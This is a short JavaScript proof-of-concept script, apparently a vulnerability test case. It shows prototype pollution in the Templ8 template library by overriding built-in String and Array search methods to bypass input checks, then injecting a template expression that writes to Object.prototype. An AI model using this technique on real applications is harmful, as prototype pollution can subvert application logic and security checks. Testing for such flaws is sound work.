String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
console.log({}.polluted);
const Templ8 = require('Templ8');
const tpl = new Templ8('{{constructor.prototype.polluted="yes"}}');
tpl.parse();
try {
    console.log('{ ' + polluted + ', ' + 'yes' + ' }');
} catch {
    console.log('{ ' + false + ', ' + true + ' }');
}